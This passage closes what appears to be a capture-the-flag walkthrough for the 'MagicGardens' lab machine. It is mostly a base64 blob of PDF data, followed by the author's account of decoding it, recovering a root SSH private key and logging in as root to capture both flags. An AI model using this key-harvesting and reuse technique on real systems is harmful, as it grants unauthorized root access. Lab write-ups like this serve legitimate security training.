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","stream":null}}
```

All I did was copy the base64-encoded data and pasted it into [https://base64.guru/converter/decode/pdf](https://base64.guru/converter/decode/pdf) to convert it from base64 to PDF format.

Finally, I used the data from the resulting id_rsa file to log in as the root user. And obtained the both user flag and root flag altogether.

![Untitled](MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%208.png)

With that, we successfully rooted the box, obtaining both the user flag and the root flag.

## Conclusion

Thanks for following along with my walkthrough! Using various tools and techniques, we successfully identified vulnerabilities, exploited them, and gained root access. Keep exploring and happy hacking!
